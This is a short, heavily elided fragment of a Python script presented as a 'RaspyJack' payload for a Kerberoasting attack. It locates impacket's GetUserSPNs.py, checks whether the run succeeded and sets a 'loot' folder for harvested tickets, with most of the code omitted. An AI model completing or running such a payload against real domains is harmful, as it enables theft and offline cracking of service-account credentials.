#!/usr/bin/env python3
"""
RaspyJack *payload* – **Kerberoasting Attack**
==============================================
...
def run_attack():
    ...
    get_user_spns_path = os.path.join(RASPYJACK_ROOT, "impacket-examples", "GetUserSPNs.py")
    ...
    try:
        ...
        if process.returncode == 0:
            ...
            loot_dir = os.path.join(RASPYJACK_ROOT, "loot", "kerberoasting")
